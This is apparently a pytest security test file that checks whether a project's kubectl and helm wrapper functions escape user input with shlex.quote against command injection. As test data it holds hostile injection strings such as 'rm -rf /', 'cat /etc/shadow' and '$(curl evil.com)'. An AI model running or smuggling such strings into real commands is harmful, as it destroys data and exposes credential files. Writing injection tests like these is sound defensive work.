"""Security tests for command injection prevention.

These tests verify that user-provided inputs are properly sanitized
before being used in shell commands to prevent command injection attacks.
"""

import shlex
from unittest.mock import MagicMock, patch

import pytest


class TestShlexQuoteUsage:
    """Tests that verify shlex.quote is used for user inputs in shell commands."""

    @pytest.fixture
    def mock_execute_os_command(self):
        """Mock execute_os_command to capture the command string."""
        with patch("mcli.lib.auth.token_util.execute_os_command") as mock:
            mock.return_value = ""
            yield mock

    def test_delete_namespace_escapes_context(self, mock_execute_os_command):
        """Test that delete_namespace escapes context parameter."""
        from mcli.lib.auth.token_util import delete_namespace

        # Malicious context with command injection attempt
        malicious_context = "dev; rm -rf /"

        delete_namespace(malicious_context, "test-ns")

        # Verify the command was called
        assert mock_execute_os_command.called
        cmd = mock_execute_os_command.call_args[0][0]

        # The malicious string should be quoted, not executed as separate command
        assert shlex.quote(malicious_context) in cmd
        # Should NOT contain unquoted semicolon that would allow injection
        assert "; rm -rf /" not in cmd or f"'{malicious_context}'" in cmd

    def test_delete_namespace_escapes_namespace(self, mock_execute_os_command):
        """Test that delete_namespace escapes namespace parameter."""
        from mcli.lib.auth.token_util import delete_namespace

        # Malicious namespace with command injection attempt
        malicious_namespace = "test-ns; cat /etc/passwd"

        delete_namespace("dev", malicious_namespace)

        assert mock_execute_os_command.called
        cmd = mock_execute_os_command.call_args[0][0]

        # The malicious string should be quoted
        assert shlex.quote(malicious_namespace) in cmd

    def test_delete_namespace_skips_default(self, mock_execute_os_command):
        """Test that delete_namespace skips 'default' namespace."""
        from mcli.lib.auth.token_util import delete_namespace

        delete_namespace("dev", "default")

        # Should not execute any command for default namespace
        assert not mock_execute_os_command.called

    def test_ensure_namespace_escapes_context(self):
        """Test that ensure_namespace escapes context parameter."""
        with patch("mcli.lib.auth.token_util.execute_os_command") as mock_exec:
            # Return empty namespace list
            mock_exec.return_value = '{"items": []}'

            from mcli.lib.auth.token_util import ensure_namespace

            malicious_context = "dev && echo pwned"
            ensure_namespace("test-ns", malicious_context)

            # Check both calls (get ns and create ns)
            for call in mock_exec.call_args_list:
                cmd = call[0][0]
                # Should be properly quoted
                if malicious_context.replace(" ", "") in cmd.replace(" ", ""):
                    assert shlex.quote(malicious_context) in cmd

    def test_ensure_namespace_escapes_namespace(self):
        """Test that ensure_namespace escapes namespace parameter."""
        with patch("mcli.lib.auth.token_util.execute_os_command") as mock_exec:
            # Return empty namespace list so it tries to create
            mock_exec.return_value = '{"items": []}'

            from mcli.lib.auth.token_util import ensure_namespace

            malicious_namespace = "test; whoami"
            ensure_namespace(malicious_namespace, "dev")

            # The create namespace call should have quoted the namespace
            create_call = [c for c in mock_exec.call_args_list if "create" in c[0][0]]
            if create_call:
                cmd = create_call[0][0][0]
                assert shlex.quote(malicious_namespace) in cmd

    def test_uninstall_helm_escapes_all_params(self):
        """Test that uninstall_helm escapes all user parameters."""
        with patch("mcli.lib.auth.token_util.execute_os_command") as mock_exec:
            from mcli.lib.auth.token_util import uninstall_helm

            malicious_release = "my-release; rm -rf /"
            malicious_namespace = "ns; cat /etc/shadow"
            malicious_context = "ctx && curl evil.com"

            uninstall_helm(malicious_namespace, malicious_release, malicious_context)

            assert mock_exec.called
            cmd = mock_exec.call_args[0][0]

            # All three parameters should be quoted
            assert shlex.quote(malicious_release) in cmd
            assert shlex.quote(malicious_namespace) in cmd
            assert shlex.quote(malicious_context) in cmd


class TestCommandInjectionVectors:
    """Tests for common command injection attack vectors."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "; rm -rf /",
            "& rm -rf /",
            "| rm -rf /",
            "$(rm -rf /)",
            "`rm -rf /`",
            "\n rm -rf /",
            "test\nrm -rf /",
            "test; echo pwned",
            "test && echo pwned",
            "test || echo pwned",
            "$(curl evil.com)",
            "test`curl evil.com`",
        ],
    )
    def test_shlex_quote_handles_injection_vectors(self, malicious_input):
        """Test that shlex.quote properly escapes all common injection vectors."""
        quoted = shlex.quote(malicious_input)

        # The quoted string should be safe to use in a shell command
        # It should either be wrapped in single quotes or have special chars escaped
        assert quoted.startswith("'") or "\\" in quoted

        # The original dangerous characters should not be executable
        # When the quoted string is used, it should be treated as a literal string


class TestPatchServiceAccountSecurity:
    """Tests for patch_service_account security."""

    def test_patch_service_account_escapes_inputs(self):
        """Test that patch_service_account escapes user inputs."""
        with patch("mcli.lib.auth.token_util.execute_os_command") as mock_exec:
            from mcli.lib.auth.token_util import patch_service_account

            malicious_namespace = "ns; cat /etc/passwd"
            malicious_service_account = "default; rm -rf /"

            patch_service_account(
                malicious_namespace,
                "registry.example.com",
                context="dev",
                service_account_name=malicious_service_account,
            )

            assert mock_exec.called
            cmd = mock_exec.call_args[0][0]

            # Both namespace and service_account should be quoted
            assert shlex.quote(malicious_namespace) in cmd
            assert shlex.quote(malicious_service_account) in cmd


class TestConfigureRegistrySecret:
    """Tests for configure_registry_secret function."""

    def test_configure_registry_secret_passes_context_not_context_arg(self):
        """Test that configure_registry_secret passes context (not context_arg) to patch_service_account.

        This is a regression test for a bug where context_arg (e.g., ' --context dev')
        was incorrectly passed to patch_service_account instead of context (e.g., 'dev').
        """
        with (
            patch("mcli.lib.auth.token_util.execute_os_command") as mock_exec,
            patch("mcli.lib.auth.token_util.container_access_token") as mock_token,
            patch("mcli.lib.auth.token_util.time.sleep"),
        ):  # Skip the 10 second sleep

            # Mock the container_access_token to return a fake token
            mock_token.return_value = "fake-token"

            # Mock execute_os_command to return valid JSON for namespace check
            def mock_exec_side_effect(cmd, *args, **kwargs):
                if "get ns -o json" in cmd:
                    # Return namespace list with test-ns already existing
                    return '{"items": [{"metadata": {"name": "test-ns"}}]}'
                return ""

            mock_exec.side_effect = mock_exec_side_effect

            from mcli.lib.auth.token_util import configure_registry_secret

            test_context = "my-kube-context"
            configure_registry_secret(
                namespace="test-ns", container_registry="registry.example.com", context=test_context
            )

            # Find the patch serviceaccount call
            patch_calls = [
                call for call in mock_exec.call_args_list if "patch serviceaccount" in call[0][0]
            ]

            assert len(patch_calls) == 1, "Expected exactly one patch serviceaccount call"
            patch_cmd = patch_calls[0][0][0]

            # The context should be properly quoted, not contain the raw --context flag
            # Bug: was passing " --context my-kube-context" instead of "my-kube-context"
            assert f"--context {shlex.quote(test_context)}" in patch_cmd
            # Should NOT have double --context flags
            assert "--context  --context" not in patch_cmd
            assert "--context ' --context" not in patch_cmd
